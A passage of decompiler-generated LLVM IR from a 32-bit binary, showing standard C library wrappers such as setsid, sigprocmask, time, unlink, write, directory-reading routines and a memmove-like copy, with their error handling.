  store i32 %v0_804fb29, i32* %stack_var_-4, align 4
  %v1_804fb32 = call i32 @setsid(i32 %v0_804fb29)
  store i32 %v1_804fb32, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fb32, -4095
  br i1 %tmp7, label %dec_label_pc_804fb49, label %dec_label_pc_804fb3d

dec_label_pc_804fb3d:                             ; preds = %dec_label_pc_804fb29
  %v1_804fb3d = call i32 @function_804fe1b(i32 %v0_804fb29)
  %v0_804fb42 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fb42 = sub i32 0, %v0_804fb42
  %v2_804fb44 = inttoptr i32 %v1_804fb3d to i32*
  store i32 %v1_804fb42, i32* %v2_804fb44, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fb4d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb49

dec_label_pc_804fb49:                             ; preds = %dec_label_pc_804fb29, %dec_label_pc_804fb3d
  %v2_804fb4d = phi i32 [ %v0_804fb29, %dec_label_pc_804fb29 ], [ %v2_804fb4d.pre, %dec_label_pc_804fb3d ]
  %v0_804fb49 = phi i32 [ %v1_804fb32, %dec_label_pc_804fb29 ], [ -1, %dec_label_pc_804fb3d ]
  store i32 %v2_804fb4d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fb49

; uselistorder directives
  uselistorder i32 %v1_804fb32, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804fb49, { 1, 0 }
}

define i32 @function_804fb4f(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fb4f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fb50 = load i32, i32* @esi, align 4
  %v4_804fb54 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804fb54, i32* @ecx, align 4
  %v2_804fb60 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  %tmp11 = icmp ult i32 %arg1, 3
  %or.cond = or i1 %tmp11, %v2_804fb60
  br i1 %or.cond, label %dec_label_pc_804fb79, label %dec_label_pc_804fb69

dec_label_pc_804fb69:                             ; preds = %dec_label_pc_804fb4f
  %v1_804fb69 = call i32 @function_804fe1b(i32 %v0_804fb50)
  %v1_804fb6e = inttoptr i32 %v1_804fb69 to i32*
  store i32 22, i32* %v1_804fb6e, align 4
  br label %dec_label_pc_804fba0

dec_label_pc_804fb79:                             ; preds = %dec_label_pc_804fb4f
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804fb7e = load i32, i32* @ebx, align 4
  %v7_804fb86 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804fb7e, i32* @ebx, align 4
  store i32 %v7_804fb86, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804fb86, -4095
  br i1 %tmp12, label %dec_label_pc_804fba0, label %dec_label_pc_804fb92

dec_label_pc_804fb92:                             ; preds = %dec_label_pc_804fb79
  %v1_804fb92 = call i32 @function_804fe1b(i32 %v0_804fb7e)
  %v0_804fb97 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fb97 = sub i32 0, %v0_804fb97
  %v2_804fb99 = inttoptr i32 %v1_804fb92 to i32*
  store i32 %v1_804fb97, i32* %v2_804fb99, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fba0

dec_label_pc_804fba0:                             ; preds = %dec_label_pc_804fb92, %dec_label_pc_804fb79, %dec_label_pc_804fb69
  %storemerge = phi i32 [ -1, %dec_label_pc_804fb69 ], [ %v7_804fb86, %dec_label_pc_804fb79 ], [ -1, %dec_label_pc_804fb92 ]
  %v2_804fba0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fba0, i32* @edx, align 4
  store i32 %v0_804fb50, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804fb86, { 1, 0, 2 }
  uselistorder i32 %v0_804fb7e, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804fba4() local_unnamed_addr {
dec_label_pc_804fba4:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fba4 = load i32, i32* @edi, align 4
  store i32 %v0_804fba4, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_804fbac = load i32, i32* @ebx, align 4
  %v1_804fbb4 = inttoptr i32 %tmp to i32*
  %v2_804fbb4 = call i32 @time(i32* %v1_804fbb4)
  store i32 %v0_804fbac, i32* @ebx, align 4
  store i32 %v2_804fbb4, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804fbb4, -4095
  br i1 %tmp9, label %dec_label_pc_804fbcc, label %dec_label_pc_804fbc0

dec_label_pc_804fbc0:                             ; preds = %dec_label_pc_804fba4
  %v1_804fbc0 = call i32 @function_804fe1b(i32 %v0_804fbac)
  %v0_804fbc5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fbc5 = sub i32 0, %v0_804fbc5
  %v2_804fbc7 = inttoptr i32 %v1_804fbc0 to i32*
  store i32 %v1_804fbc5, i32* %v2_804fbc7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fbd0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fbcc

dec_label_pc_804fbcc:                             ; preds = %dec_label_pc_804fba4, %dec_label_pc_804fbc0
  %v2_804fbd0 = phi i32 [ %v0_804fba4, %dec_label_pc_804fba4 ], [ %v2_804fbd0.pre, %dec_label_pc_804fbc0 ]
  %v0_804fbcc = phi i32 [ %v2_804fbb4, %dec_label_pc_804fba4 ], [ -1, %dec_label_pc_804fbc0 ]
  store i32 %v2_804fbd0, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fbcc

; uselistorder directives
  uselistorder i32 %v2_804fbb4, { 1, 0, 2 }
  uselistorder i32 %v0_804fbac, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804fbcc, { 1, 0 }
}

define i32 @function_804fbd2(i8* %arg1) local_unnamed_addr {
dec_label_pc_804fbd2:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbd2 = load i32, i32* @edi, align 4
  store i32 %v0_804fbd2, i32* %stack_var_-4, align 4
  %v4_804fbd6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fbd6, i32* %edi.global-to-local, align 4
  %v0_804fbda = load i32, i32* @ebx, align 4
  %v3_804fbe2 = call i32 @unlink(i8* %arg1)
  store i32 %v3_804fbe2, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_804fbe2, -4095
  br i1 %tmp10, label %dec_label_pc_804fbfa, label %dec_label_pc_804fbee

dec_label_pc_804fbee:                             ; preds = %dec_label_pc_804fbd2
  %v1_804fbee = call i32 @function_804fe1b(i32 %v0_804fbda)
  %v0_804fbf3 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fbf3 = sub i32 0, %v0_804fbf3
  %v2_804fbf5 = inttoptr i32 %v1_804fbee to i32*
  store i32 %v1_804fbf3, i32* %v2_804fbf5, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fbfe.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fbfa

dec_label_pc_804fbfa:                             ; preds = %dec_label_pc_804fbd2, %dec_label_pc_804fbee
  %v2_804fbfe = phi i32 [ %v0_804fbd2, %dec_label_pc_804fbd2 ], [ %v2_804fbfe.pre, %dec_label_pc_804fbee ]
  %v0_804fbfa = phi i32 [ %v3_804fbe2, %dec_label_pc_804fbd2 ], [ -1, %dec_label_pc_804fbee ]
  store i32 %v2_804fbfe, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fbfa

; uselistorder directives
  uselistorder i32 %v3_804fbe2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fbfa, { 1, 0 }
}

define i32 @function_804fc00(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fc00:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc00 = load i32, i32* @edi, align 4
  store i32 %v0_804fc00, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fc10 = load i32, i32* @ebx, align 4
  %v4_804fc18 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_804fc18, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804fc18, -4095
  br i1 %tmp12, label %dec_label_pc_804fc30, label %dec_label_pc_804fc24

dec_label_pc_804fc24:                             ; preds = %dec_label_pc_804fc00
  %v1_804fc24 = call i32 @function_804fe1b(i32 %v0_804fc10)
  %v0_804fc29 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fc29 = sub i32 0, %v0_804fc29
  %v2_804fc2b = inttoptr i32 %v1_804fc24 to i32*
  store i32 %v1_804fc29, i32* %v2_804fc2b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fc34.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fc30

dec_label_pc_804fc30:                             ; preds = %dec_label_pc_804fc00, %dec_label_pc_804fc24
  %v2_804fc34 = phi i32 [ %v0_804fc00, %dec_label_pc_804fc00 ], [ %v2_804fc34.pre, %dec_label_pc_804fc24 ]
  %v0_804fc30 = phi i32 [ %v4_804fc18, %dec_label_pc_804fc00 ], [ -1, %dec_label_pc_804fc24 ]
  store i32 %v2_804fc34, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fc30

; uselistorder directives
  uselistorder i32 %v4_804fc18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc30, { 1, 0 }
}

define i32 @function_804fc36(i32* %arg1) local_unnamed_addr {
dec_label_pc_804fc36:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_804fc38 = load i32, i32* @ebx, align 4
  %v12_804fc39 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp3, i32* @edi, align 4
  %v2_804fc40 = load i32, i32* %arg1, align 4
  %v12_804fc40 = icmp eq i32 %v2_804fc40, -1
  %v1_804fc43 = icmp eq i1 %v12_804fc40, false
  br i1 %v1_804fc43, label %dec_label_pc_804fc55, label %dec_label_pc_804fc45

dec_label_pc_804fc45:                             ; preds = %dec_label_pc_804fc36
  %v1_804fc45 = call i32 @function_804fe1b(i32 %v0_804fc38)
  %v1_804fc4a = inttoptr i32 %v1_804fc45 to i32*
  store i32 9, i32* %v1_804fc4a, align 4
  br label %dec_label_pc_804fc9f

dec_label_pc_804fc55:                             ; preds = %dec_label_pc_804fc36
  %v1_804fc55 = add i32 %tmp3, 24
  store i32 %v12_804fc39, i32* @esi, align 4
  %v2_804fc64 = call i32 @function_8051757(i32 %v12_804fc39, i32 134551380)
  %v1_804fc6c = call i32 @function_8051754(i32 %v1_804fc55)
  store i32 %v1_804fc6c, i32* @eax, align 4
  %v0_804fc71 = load i32, i32* @edi, align 4
  %v1_804fc71 = inttoptr i32 %v0_804fc71 to i32*
  %v2_804fc71 = load i32, i32* %v1_804fc71, align 4
  store i32 %v2_804fc71, i32* @ebx, align 4
  store i32 -1, i32* %v1_804fc71, align 4
  %v2_804fc7e = call i32 @function_8051757(i32 %v12_804fc39, i32 1)
  %v0_804fc84 = load i32, i32* @edi, align 4
  %v1_804fc84 = add i32 %v0_804fc84, 12
  %v2_804fc84 = inttoptr i32 %v1_804fc84 to i32*
  %v3_804fc84 = load i32, i32* %v2_804fc84, align 4
  %v1_804fc87 = call i32 @function_8050ff0(i32 %v3_804fc84)
  %v0_804fc8c = load i32, i32* @edi, align 4
  %v1_804fc8f = call i32 @function_8050ff0(i32 %v0_804fc8c)
  %v0_804fc94 = load i32, i32* @ebx, align 4
  %v1_804fc97 = call i32 @function_804f8e3(i32 %v0_804fc94)
  br label %dec_label_pc_804fc9f

dec_label_pc_804fc9f:                             ; preds = %dec_label_pc_804fc45, %dec_label_pc_804fc55
  %v0_804fca5 = phi i32 [ -1, %dec_label_pc_804fc45 ], [ %v1_804fc97, %dec_label_pc_804fc55 ]
  ret i32 %v0_804fca5

; uselistorder directives
  uselistorder label %dec_label_pc_804fc9f, { 1, 0 }
}

define i32 @function_804fca6(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fca6:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_804fcb7 = inttoptr i32 %arg1 to i8*
  %v3_804fcb7 = call i32 @function_804f9f4(i8* %v2_804fcb7, i32 67584)
  store i32 %v3_804fcb7, i32* %eax.global-to-local, align 4
  store i32 %v3_804fcb7, i32* @edi, align 4
  %v2_804fcc1 = icmp slt i32 %v3_804fcb7, 0
  br i1 %v2_804fcc1, label %dec_label_pc_804fd8e, label %dec_label_pc_804fcc9

dec_label_pc_804fcc9:                             ; preds = %dec_label_pc_804fca6
  %v0_804fcc9 = load i32, i32* @ebx, align 4
  %v2_804fccb = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_804fccb, i32* %eax.global-to-local, align 4
  store i32 %v3_804fcb7, i32* %stack_var_-124, align 4
  %v4_804fcd1 = call i32 @function_8051b52(i32 %v3_804fcb7, i32 %v2_804fccb, i32 %v0_804fcc9, i32 %v0_804fcc9)
  store i32 %v4_804fcd1, i32* %eax.global-to-local, align 4
  %v2_804fcd9 = icmp slt i32 %v4_804fcd1, 0
  br i1 %v2_804fcd9, label %dec_label_pc_804fcef, label %dec_label_pc_804fcdd

dec_label_pc_804fcdd:                             ; preds = %dec_label_pc_804fcc9
  %v0_804fce2 = load i32, i32* @edi, align 4
  store i32 %v0_804fce2, i32* %stack_var_-124, align 4
  %v3_804fce3 = call i32 @function_804f84d(i32 %v0_804fce2, i32 2, i32 1)
  store i32 %v3_804fce3, i32* %eax.global-to-local, align 4
  %v2_804fceb = icmp slt i32 %v3_804fce3, 0
  %v1_804fced = icmp eq i1 %v2_804fceb, false
  br i1 %v1_804fced, label %dec_label_pc_804fd05, label %dec_label_pc_804fcef

dec_label_pc_804fcef:                             ; preds = %dec_label_pc_804fcdd, %dec_label_pc_804fcc9
  %v0_804fcef = load i32, i32* %stack_var_-124, align 4
  %v1_804fcef = call i32 @function_804fe1b(i32 %v0_804fcef)
  store i32 %v1_804fcef, i32* %eax.global-to-local, align 4
  store i32 %v1_804fcef, i32* @ebx, align 4
  %v1_804fcf9 = inttoptr i32 %v1_804fcef to i32*
  %v2_804fcf9 = load i32, i32* %v1_804fcf9, align 4
  %v0_804fcfb = load i32, i32* @edi, align 4
  store i32 %v0_804fcfb, i32* %stack_var_-124, align 4
  %v1_804fcfc = call i32 @function_804f8e3(i32 %v0_804fcfb)
  store i32 %v1_804fcfc, i32* %eax.global-to-local, align 4
  %v1_804fd01 = load i32, i32* @ebx, align 4
  %v2_804fd01 = inttoptr i32 %v1_804fd01 to i32*
  store i32 %v2_804fcf9, i32* %v2_804fd01, align 4
  br label %dec_label_pc_804fd7a

dec_label_pc_804fd05:                             ; preds = %dec_label_pc_804fcdd
  store i32 48, i32* %stack_var_-124, align 4
  %v1_804fd0a = call i32 @function_805022b(i32 48)
  store i32 %v1_804fd0a, i32* %eax.global-to-local, align 4
  store i32 %v1_804fd0a, i32* @ebx, align 4
  %v1_804fd14 = icmp eq i32 %v1_804fd0a, 0
  br i1 %v1_804fd14, label %dec_label_pc_804fd66, label %dec_label_pc_804fd18

dec_label_pc_804fd18:                             ; preds = %dec_label_pc_804fd05
  %v0_804fd18 = load i32, i32* @edi, align 4
  %v2_804fd18 = inttoptr i32 %v1_804fd0a to i32*
  store i32 %v0_804fd18, i32* %v2_804fd18, align 4
  %v1_804fd1a = add i32 %v1_804fd0a, 16
  %v2_804fd1a = inttoptr i32 %v1_804fd1a to i32*
  store i32 0, i32* %v2_804fd1a, align 4
  %v1_804fd21 = add i32 %v1_804fd0a, 8
  %v2_804fd21 = inttoptr i32 %v1_804fd21 to i32*
  store i32 0, i32* %v2_804fd21, align 4
  %v1_804fd28 = add i32 %v1_804fd0a, 4
  %v2_804fd28 = inttoptr i32 %v1_804fd28 to i32*
  store i32 0, i32* %v2_804fd28, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_804fd33 = load i32, i32* @ebx, align 4
  %v2_804fd33 = add i32 %v1_804fd33, 20
  %v3_804fd33 = inttoptr i32 %v2_804fd33 to i32*
  store i32 %tmp, i32* %v3_804fd33, align 4
  %v0_804fd36 = load i32, i32* %eax.global-to-local, align 4
  %v6_804fd3b = icmp ugt i32 %v0_804fd36, 511
  br i1 %v6_804fd3b, label %dec_label_pc_804fd44, label %dec_label_pc_804fd3d

dec_label_pc_804fd3d:                             ; preds = %dec_label_pc_804fd18
  %v0_804fd3d = load i32, i32* @ebx, align 4
  %v1_804fd3d = add i32 %v0_804fd3d, 20
  %v2_804fd3d = inttoptr i32 %v1_804fd3d to i32*
  store i32 512, i32* %v2_804fd3d, align 4
  br label %dec_label_pc_804fd44

dec_label_pc_804fd44:                             ; preds = %dec_label_pc_804fd18, %dec_label_pc_804fd3d
  %v0_804fd44 = load i32, i32* @edx, align 4
  %v0_804fd46 = load i32, i32* @ebx, align 4
  %v1_804fd46 = add i32 %v0_804fd46, 20
  %v2_804fd46 = inttoptr i32 %v1_804fd46 to i32*
  %v3_804fd46 = load i32, i32* %v2_804fd46, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v5_804fd4b = call i32 @function_805099f(i64 1, i32 %v3_804fd46, i32 %v0_804fd44, i32 %v0_804fd44)
  store i32 %v5_804fd4b, i32* %eax.global-to-local, align 4
  %v1_804fd53 = load i32, i32* @ebx, align 4
  %v2_804fd53 = add i32 %v1_804fd53, 12
  %v3_804fd53 = inttoptr i32 %v2_804fd53 to i32*
  store i32 %v5_804fd4b, i32* %v3_804fd53, align 4
  %v1_804fd56 = icmp eq i32 %v5_804fd4b, 0
  %v1_804fd58 = icmp eq i1 %v1_804fd56, false
  br i1 %v1_804fd58, label %dec_label_pc_804fd7e, label %dec_label_pc_804fd5a

dec_label_pc_804fd5a:                             ; preds = %dec_label_pc_804fd44
  %v0_804fd5d = load i32, i32* @ebx, align 4
  store i32 %v0_804fd5d, i32* %stack_var_-124, align 4
  %v1_804fd5e = call i32 @function_8050ff0(i32 %v0_804fd5d)
  store i32 %v1_804fd5e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fd66

dec_label_pc_804fd66:                             ; preds = %dec_label_pc_804fd05, %dec_label_pc_804fd5a
  %v0_804fd69 = load i32, i32* @edi, align 4
  store i32 %v0_804fd69, i32* %stack_var_-124, align 4
  %v1_804fd6a = call i32 @function_804f8e3(i32 %v0_804fd69)
  store i32 %v1_804fd6a, i32* %eax.global-to-local, align 4
  %v1_804fd6f = call i32 @function_804fe1b(i32 %v0_804fd69)
  store i32 %v1_804fd6f, i32* %eax.global-to-local, align 4
  %v1_804fd74 = inttoptr i32 %v1_804fd6f to i32*
  store i32 12, i32* %v1_804fd74, align 4
  br label %dec_label_pc_804fd7a

dec_label_pc_804fd7a:                             ; preds = %dec_label_pc_804fcef, %dec_label_pc_804fd66
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804fd8b

dec_label_pc_804fd7e:                             ; preds = %dec_label_pc_804fd44
  %v0_804fd80 = load i32, i32* @ebx, align 4
  %v1_804fd80 = add i32 %v0_804fd80, 24
  store i32 %v1_804fd80, i32* %eax.global-to-local, align 4
  store i32 %v1_804fd80, i32* %stack_var_-124, align 4
  %v1_804fd86 = call i32 @function_8051754(i32 %v1_804fd80)
  store i32 %v1_804fd86, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fd8b

dec_label_pc_804fd8b:                             ; preds = %dec_label_pc_804fd7a, %dec_label_pc_804fd7e
  br label %dec_label_pc_804fd8e

dec_label_pc_804fd8e:                             ; preds = %dec_label_pc_804fca6, %dec_label_pc_804fd8b
  %v0_804fd91 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd91, i32* %eax.global-to-local, align 4
  ret i32 %v0_804fd91

; uselistorder directives
  uselistorder i32 %v5_804fd4b, { 1, 0, 2 }
  uselistorder i32 %v1_804fd0a, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v1_804fcef, { 1, 0, 2 }
  uselistorder i32 %v3_804fcb7, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @function_804f8e3, { 10, 9, 2, 8, 7, 4, 6, 3, 5, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fd8e, { 1, 0 }
  uselistorder label %dec_label_pc_804fd8b, { 1, 0 }
  uselistorder label %dec_label_pc_804fd7a, { 1, 0 }
  uselistorder label %dec_label_pc_804fd66, { 1, 0 }
  uselistorder label %dec_label_pc_804fd44, { 1, 0 }
}

define i32 @function_804fd97(i32* %arg1) local_unnamed_addr {
dec_label_pc_804fd97:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v1_804fda0 = add i32 %tmp3, 24
  store i32 %v1_804fda0, i32* @ebx, align 4
  %v2_804fda9 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804fda9, i32* @eax, align 4
  %v2_804fdae = call i32 @function_8051757(i32 %v2_804fda9, i32 134551380)
  %v0_804fdb3 = load i32, i32* @ebx, align 4
  %v1_804fdb6 = call i32 @function_8051754(i32 %v0_804fdb3)
  br label %dec_label_pc_804fdbe

dec_label_pc_804fdbe:                             ; preds = %dec_label_pc_804fde9, %dec_label_pc_804fd97
  %v0_804fdbe = load i32, i32* @esi, align 4
  %v1_804fdbe = add i32 %v0_804fdbe, 8
  %v2_804fdbe = inttoptr i32 %v1_804fdbe to i32*
  %v3_804fdbe = load i32, i32* %v2_804fdbe, align 4
  %v2_804fdc1 = add i32 %v0_804fdbe, 4
  %v3_804fdc1 = inttoptr i32 %v2_804fdc1 to i32*
  %v4_804fdc1 = load i32, i32* %v3_804fdc1, align 4
  %v6_804fdc4 = icmp ugt i32 %v3_804fdbe, %v4_804fdc1
  br i1 %v6_804fdc4, label %dec_label_pc_804fde9, label %dec_label_pc_804fdc6

dec_label_pc_804fdc6:                             ; preds = %dec_label_pc_804fdbe
  %v0_804fdc6 = load i32, i32* @edx, align 4
  %v1_804fdc7 = add i32 %v0_804fdbe, 20
  %v2_804fdc7 = inttoptr i32 %v1_804fdc7 to i32*
  %v3_804fdc7 = load i32, i32* %v2_804fdc7, align 4
  %v1_804fdca = add i32 %v0_804fdbe, 12
  %v2_804fdca = inttoptr i32 %v1_804fdca to i32*
  %v3_804fdca = load i32, i32* %v2_804fdca, align 4
  %v1_804fdcd = inttoptr i32 %v0_804fdbe to i32*
  %v2_804fdcd = load i32, i32* %v1_804fdcd, align 4
  %v4_804fdcf = call i32 @function_8051b9a(i32 %v2_804fdcd, i32 %v3_804fdca, i32 %v3_804fdc7, i32 %v0_804fdc6)
  %tmp13 = icmp slt i32 %v4_804fdcf, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_804fddf, label %dec_label_pc_804fddb

dec_label_pc_804fddb:                             ; preds = %dec_label_pc_804fdc6
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804fe05

dec_label_pc_804fddf:                             ; preds = %dec_label_pc_804fdc6
  %v1_804fddf = load i32, i32* @esi, align 4
  %v2_804fddf = add i32 %v1_804fddf, 8
  %v3_804fddf = inttoptr i32 %v2_804fddf to i32*
  store i32 %v4_804fdcf, i32* %v3_804fddf, align 4
  %v0_804fde2 = load i32, i32* @esi, align 4
  %v1_804fde2 = add i32 %v0_804fde2, 4
  %v2_804fde2 = inttoptr i32 %v1_804fde2 to i32*
  store i32 0, i32* %v2_804fde2, align 4
  %v0_804fde9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fde9

dec_label_pc_804fde9:                             ; preds = %dec_label_pc_804fdbe, %dec_label_pc_804fddf
  %v1_804fdf7 = phi i32 [ %v0_804fdbe, %dec_label_pc_804fdbe ], [ %v0_804fde9.pre, %dec_label_pc_804fddf ]
  %v1_804fde9 = add i32 %v1_804fdf7, 4
  %v2_804fde9 = inttoptr i32 %v1_804fde9 to i32*
  %v3_804fde9 = load i32, i32* %v2_804fde9, align 4
  %v2_804fdee = add i32 %v1_804fdf7, 12
  %v3_804fdee = inttoptr i32 %v2_804fdee to i32*
  %v4_804fdee = load i32, i32* %v3_804fdee, align 4
  %v5_804fdee = add i32 %v4_804fdee, %v3_804fde9
  store i32 %v5_804fdee, i32* @ebx, align 4
  %v1_804fdf1 = add i32 %v5_804fdee, 8
  %v2_804fdf1 = inttoptr i32 %v1_804fdf1 to i16*
  %v3_804fdf1 = load i16, i16* %v2_804fdf1, align 2
  %v4_804fdf1 = zext i16 %v3_804fdf1 to i32
  store i32 %v4_804fdf1, i32* @edx, align 4
  %v2_804fdf5 = add i32 %v4_804fdf1, %v3_804fde9
  store i32 %v2_804fdf5, i32* %v2_804fde9, align 4
  %v0_804fdfa = load i32, i32* @ebx, align 4
  %v1_804fdfa = add i32 %v0_804fdfa, 4
  %v2_804fdfa = inttoptr i32 %v1_804fdfa to i32*
  %v3_804fdfa = load i32, i32* %v2_804fdfa, align 4
  %v1_804fdfd = load i32, i32* @esi, align 4
  %v2_804fdfd = add i32 %v1_804fdfd, 16
  %v3_804fdfd = inttoptr i32 %v2_804fdfd to i32*
  store i32 %v3_804fdfa, i32* %v3_804fdfd, align 4
  %v0_804fe00 = load i32, i32* @ebx, align 4
  %v1_804fe00 = inttoptr i32 %v0_804fe00 to i32*
  %v2_804fe00 = load i32, i32* %v1_804fe00, align 4
  %v3_804fe00 = icmp eq i32 %v2_804fe00, 0
  br i1 %v3_804fe00, label %dec_label_pc_804fdbe, label %dec_label_pc_804fe05.loopexit

dec_label_pc_804fe05.loopexit:                    ; preds = %dec_label_pc_804fde9
  br label %dec_label_pc_804fe05

dec_label_pc_804fe05:                             ; preds = %dec_label_pc_804fe05.loopexit, %dec_label_pc_804fddb
  store i32 %v2_804fda9, i32* @eax, align 4
  %v2_804fe0e = call i32 @function_8051757(i32 %v2_804fda9, i32 1)
  %v0_804fe13 = load i32, i32* @ebx, align 4
  ret i32 %v0_804fe13

; uselistorder directives
  uselistorder i32 %v1_804fdf7, { 1, 0 }
  uselistorder i32 %v0_804fdbe, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_804fde9, { 1, 0 }
}

define i32 @function_804fe1b(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fe1b:
  ret i32 ptrtoint (i32* @global_var_8053a74.29 to i32)
}

define i32 @function_804fe21() local_unnamed_addr {
dec_label_pc_804fe21:
  %tmp = call i64 @__decompiler_undefined_function_6()
  %stack_var_-16 = alloca i32, align 4
  %v1_804fe29 = bitcast i32* %stack_var_-16 to %tms*
  %v2_804fe29 = call i32 @function_8051f6f(%tms* %v1_804fe29)
  %v4_804fe2e = trunc i64 %tmp to i32
  %v4_804fe32 = load i32, i32* %stack_var_-16, align 4
  %v5_804fe32 = add i32 %v4_804fe32, %v4_804fe2e
  %v3_804fe39 = mul i32 %v5_804fe32, 10000
  %v1_804fe3f = and i32 %v3_804fe39, 2147483632
  ret i32 %v1_804fe3f

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804fe45(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fe45:
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804fe46 = load i32, i32* @esi, align 4
  store i32 %v0_804fe46, i32* %stack_var_-8, align 4
  %v4_804fe47 = ptrtoint i8* %arg1 to i32
  %v9_804fe53 = icmp ugt i8* %tmp4, %arg1
  %v1_804fe55 = icmp eq i1 %v9_804fe53, false
  br i1 %v1_804fe55, label %dec_label_pc_804fe5d, label %dec_label_pc_804fe57

dec_label_pc_804fe57:                             ; preds = %dec_label_pc_804fe45
  %v7_804fe59 = call i8* @_memcpy(i8* %arg1, i8* %tmp4, i32 %arg3)
  br label %dec_label_pc_804fe69

dec_label_pc_804fe5d:                             ; preds = %dec_label_pc_804fe45
  %v3_804fe5d = add i32 %arg2, -1
  %v4_804fe5d = add i32 %v3_804fe5d, %arg3
  %v5_804fe5d = inttoptr i32 %v4_804fe5d to i8*
  %v3_804fe61 = add i32 %v4_804fe47, -1
  %v4_804fe61 = add i32 %v3_804fe61, %arg3
  %v5_804fe61 = inttoptr i32 %v4_804fe61 to i8*
  %v7_804fe66 = call i8* @_memcpy(i8* %v5_804fe61, i8* %v5_804fe5d, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_804fe69

dec_label_pc_804fe69:                             ; preds = %dec_label_pc_804fe57, %dec_label_pc_804fe5d
